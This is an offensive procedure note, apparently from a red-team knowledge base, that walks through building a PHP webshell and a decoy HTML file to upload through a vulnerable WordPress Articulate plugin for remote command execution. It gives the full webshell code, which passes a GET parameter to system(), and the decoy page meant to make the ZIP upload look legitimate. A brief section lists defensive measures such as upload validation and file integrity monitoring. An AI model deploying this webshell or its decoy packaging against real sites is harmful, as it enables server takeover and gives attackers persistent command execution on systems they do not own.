---
tags:
  - webshell
  - php
  - rce
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - PHP
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unix Shell]]'
updated_at: '2025-12-14T17:23:19.985Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: d6e148f7-b58e-4a25-90ba-bbd92306259b
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Unix Shell]]'
---
# Create-Malicious-PHP-Webshell

## Summary

This procedure creates a simple PHP webshell file that executes system commands passed via a GET parameter, paired with a decoy HTML file to mimic legitimate Articulate content.

## Description

In the context of exploiting the WordPress Articulate plugin, this involves crafting index.php to read and execute commands from $_GET['cmd'] using system() or similar, while index.html provides a benign facade. The files are placed in a ZIP for upload. Prerequisites include a local environment with PHP and a text editor. Expected outcome is files ready for compression, leading to RCE post-upload.

## Requirements

1. Local machine with text editor (e.g., vim, nano)
2. Basic PHP knowledge to avoid syntax errors
3. Target confirmation: WordPress with vulnerable plugin

## Defense

Defensive measures and detection strategies:

- Validate and sanitize all file uploads, rejecting ZIPs or scanning for executables
- Disable or remove unused plugins like Articulate
- Monitor /wp-content/uploads/ for unexpected PHP files using file integrity monitoring (e.g., Tripwire)
- Web Application Firewall (WAF) rules to block suspicious uploads to JSON endpoints

## Objectives

1. Generate executable PHP code for command injection
2. Create decoy file to evade basic checks
3. Prepare payload for ZIP packaging and upload

## Instructions

### Step 1: Create Decoy HTML File

**Context**: This step creates a simple index.html to make the ZIP appear as legitimate Articulate content.

**Command** (Manual file creation):

Create index.html:

```html
<!DOCTYPE html>
<html>
<head><title>Articulate Content</title></head>
<body><h1>Embedded Content</h1></body>
</html>
```

> Save as index.html. Expected output: A basic HTML file.

### Step 2: Create PHP Webshell

**Context**: Craft index.php to execute system commands from the 'cmd' GET parameter.

**Command** (Manual file creation):

Create index.php:

```php
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

> Save as index.php. Expected output: PHP file that runs commands like ?cmd=ls when accessed.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Unix Shell]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- webshell
- php
- rce
